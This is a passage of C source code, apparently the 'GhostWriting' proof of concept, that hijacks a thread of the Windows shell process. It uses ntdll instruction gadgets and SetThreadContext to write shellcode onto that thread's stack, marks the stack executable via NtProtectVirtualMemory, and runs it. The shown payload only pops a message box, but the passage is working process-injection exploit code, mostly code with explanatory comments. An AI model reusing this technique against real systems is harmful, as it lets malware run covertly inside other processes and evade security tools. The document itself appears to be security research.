		// |                    |
		// |____________________|
		// |                    |<--- BASEOfWrittenBytes
		// | dummy a            |
		// | dummy b            |
		// | .                  |
		// | .                  |
		// | dummy z            |
		// |____________________|
		// | JMPTOSELFAddress -------------------.
		// |____________________|                |
		// | SIMULATED RETADDR  |<--- ESP        |
		// | p.1: ProcessHandle |                |
		// | p.2: &BaseAddress -----------.      |
		// | p.3: &NumBytesProt --------. |      |
		// | p.4: NewAccessProt |       | |      |
		// | p.5: &OldAccessPrt ----.   | |      |
		// | BaseAddress --.    |<--+---+-´      |
		// | NumBytesProt  |    |<--+---´        |
		// | OldAccessPrt  |    |<--´            |
		// |-------------- v ---|                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |                                    SOMEWHERE INTO NTDLL.DLL's CODE
		// |                    |                |                                    _______________________________
		// |                    |                |      EIP == JMPTOSELFAddress --->\|                               |
		// |                    |                `--------------------------------->/|  JMP $                        |
		// |                    |                                                    |_______________________________|
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- Initial ESP
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |____________________|<--- Stack Top
		//
		//
		// NOTE: One could say that that return address ( JMPTOSELFAddress ) is put twice and that we could have optimized this by not writing it again,
		//       it's true. However, I preferred to isolate this call frame from the previous stack stuff in order to make it more clear and also more
		//       generic.

		// Ok, so we have set up that call frame for later usage, we could run that call to NtProtectVirtualMemory now, but, for the sake of clearness,
		// let's make the writings first and let the executions for the ending part. So let's write our last bytes, the injection executable bytes. See
		// how DWORDWritingPointer points just ahead of the previously written call frame, so we do not need to calculate it again, it actually points
		// where it needs to.

		// We save current DWORDWritingPointer's value in order to set thread's EIP to that value later on ( in injection execution phase ).
		InjectedCodeExecutionStart=DWORDWritingPointer;

		// Here we write executable code bytes, DWORD by DWORD, into thread's stack space
		//
		//  STACK STATUS
		//  ____________________
		// |                    |<--- Stack Bottom
		// |                    |
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- ,ESP == BASEOfWrittenBytes
		// | dummy a            |   ,-| +
		// | dummy b            |   | `NumberOfBytesToPopAfterMOVBeforeRET
		// | .                  |   |
		// | .                  |   |
		// | dummy z            |   |                                                         ( for i from 0 to NumberOfDWORDsToInject )---.
		// |____________________|   |                                                                                                      |
		// | JMPTORETAddress    |<--´                                                            *WriteItem ( REG2 ) == InjectionCode[i] <-|
		// || __________________|                 ,MOVRETOffsetFromMemoryRegister                                                          |
		// ||SIMULATED RETADDR  |               ,-| -                                                                                      |
		// ||p.1: ProcessHandle |               | `*WritePointer ( REG1 ) == DWORDWritingPointer+i*4 <-------------------------------------´
		// ||p.2: &BaseAddress -----------.     |                            SOMEWHERE INTO NTDLL.DLL's CODE
		// ||p.3: &NumBytesProt --------. |     |                            ________________________________________
		// ||p.4: NewAccessProt |       | |     |  EIP == MOVRETAddress --->|                                        |
		// ||p.5: &OldAccessPrt ----.   | |     |                           |  MOV [REG1],REG2 / MOV [REG1+xx],REG2  |
		// ||BaseAddress --.    |<--+---+-´     |                           |  ( POP REGx / ADD REGx,yy )            |
		// ||NumBytesProt  |    |<--+---´       |                           |  .                                     |
		// ||OldAccessPrt  |    |<--´           |                           |  .                                     |
		// || ------------ v ---|               |                           |  RET / RET n                           |
		// ||                   |<--------------´                           |________________________________________|
		// ||                   | .
		// ||                   | .
		// ||                   | .                                                   SOMEWHERE INTO NTDLL.DLL's CODE
		// ||                   |                                                     _______________________________
		// |`----------------------------------------------------------------------->|                               |
		// |                    |                                                    |  JMP $                        |
		// |                    |                                                    |_______________________________|
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- Initial ESP
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |____________________|<--- Stack Top
		//
		//

		for(i=0;i<NumberOfDWORDsToInject;i++)
		{
			WorkingThreadContext.Esp=BASEOfWrittenBytes;
			*WritePointer=DWORDWritingPointer-MOVRETOffsetFromMemoryRegister;
			*WriteItem=InjectionCode[i];
			WorkingThreadContext.Eip=MOVRETAddress;

			WaitForThreadAutoLock(Thread,&WorkingThreadContext,ThreadsWindow,JMPTOSELFAddress);

			DWORDWritingPointer+=sizeof(DWORD);
		}

		// So, after this code injection writing loop, we have achieved this:
		//
		//
		//  STACK STATUS
		//  ____________________
		// |                    |<--- Stack Bottom
		// |                    |
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- BASEOfWrittenBytes
		// | dummy a            |
		// | dummy b            |
		// | .                  |
		// | .                  |
		// | dummy z            |
		// |____________________|
		// | JMPTOSELFAddress -------------------.
		// |____________________|                |
		// | SIMULATED RETADDR  |<--- ESP        |
		// | p.1: ProcessHandle |                |
		// | p.2: &BaseAddress -----------.      |
		// | p.3: &NumBytesProt --------. |      |
		// | p.4: NewAccessProt |       | |      |
		// | p.5: &OldAccessPrt ----.   | |      |
		// | BaseAddress --.    |<--+---+-´      |
		// | NumBytesProt  |    |<--+---´        |
		// | OldAccessPrt  |    |<--´            |
		// |-------------- v ---|                |
		// | EXECUTABLE CODE    |                |
		// | EXECUTABLE CODE    |                |
		// | EXECUTABLE CODE    |                |
		// | EXECUTABLE CODE    |                |                                    SOMEWHERE INTO NTDLL.DLL's CODE
		// | EXECUTABLE CODE    |                |                                    _______________________________
		// | EXECUTABLE CODE    |                |      EIP == JMPTOSELFAddress --->\|                               |
		// | EXECUTABLE CODE    |                `--------------------------------->/|  JMP $                        |
		// | EXECUTABLE CODE    |                                                    |_______________________________|
		// | EXECUTABLE CODE    |
		// | EXECUTABLE CODE    |
		// | EXECUTABLE CODE    |
		// |____________________|
		// |                    |<--- Initial ESP
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |____________________|<--- Stack Top
		//
		//

		// Ok, all the needed stuff has been written to the hijacked stack. As we said before, first we write, then we execute. All written, let's run !

		// We will first run the NtProtectVirtualMemory with our written, simulated call frame:
		WorkingThreadContext.Esp=BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD);    // We make thread's ESP point into the call frame
		WorkingThreadContext.Eip=NtProtectVirtualMemoryAddress;    // and set thread's EIP point to the address of that API into NTDLL.DLLs code. This two
		// changes simulate the call. I hope you will understand it yourself this time  

		WaitForThreadAutoLock(Thread,&WorkingThreadContext,ThreadsWindow,JMPTOSELFAddress);

		// And finally, the moment we have all been waiting for.
		WorkingThreadContext.Esp=BASEOfWrittenBytes;    // set ESP to a "safe" place
		WorkingThreadContext.Esi=JMPTOSELFAddress;    // injected code expects ESI to be its "EXIT ADDRESS" ( see InjectionCode array declaration )
		WorkingThreadContext.Ebx=BASEOfWrittenBytes;    // injected code also expects EBX to be its "Delta Handle" or memory base address of its own
		WorkingThreadContext.Eip=InjectedCodeExecutionStart;    // set EIP to the base address where the injected executable code starts  

		WaitForThreadAutoLock(Thread,&WorkingThreadContext,ThreadsWindow,JMPTOSELFAddress);    // and... RUN !!!

		// alllllll donnneee ! let's let hijacked thread loose so it enjoys is silly life again ¬¬...
		SetThreadContext(Thread,&SavedThreadContext);    // restore initial thread's original state and restore it...
		ResumeThread(Thread);    // and resume its execution

		PostMessage(ThreadsWindow,WM_USER,0,0);    // Just in case, send a message to awake its wait...

		return TRUE;    // all went fine  

	}
	else    // else, we did not found those two patterns 
		return FALSE;    // so we return with error...
}

void main(void)
{
	HWND ShellWindowHandle;
	DWORD ShellWindowThread;
	HANDLE VictimThreadHandle;

	// We solve MessageBoxA APIs address...
	HMODULE USER32Base=LoadLibrary("USER32.DLL");
	DWORD MessageBoxAAddress=(DWORD)GetProcAddress(USER32Base,"MessageBoxA");
	FreeLibrary(USER32Base);

	*(DWORD*)(&InjectionCode[58])=MessageBoxAAddress;    // And we put that address into InjectionCode ( see InjectionCode array declaration )

	// We get our victim thread
	ShellWindowHandle=GetShellWindow();    // by first getting a handle of a window it owns
	ShellWindowThread=GetWindowThreadProcessId(ShellWindowHandle,NULL);    // and then getting the owning thread ID of that window

	VictimThreadHandle=OpenThread(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME,FALSE,ShellWindowThread);    // We open victim thread

	// And we try our injection technique over it 
	if (Inject(VictimThreadHandle,InjectionCode,(sizeof(InjectionCode)+4)/4,ShellWindowHandle))
		MessageBox(NULL,"SUCCESS ! ;D","GhostWriting: Proof Of Concept",0);    // Yay !
	else
		MessageBox(NULL,"FAILURE !  ","GhostWriting: Proof Of Concept",0);    // Ouch :S

	CloseHandle(VictimThreadHandle);
}
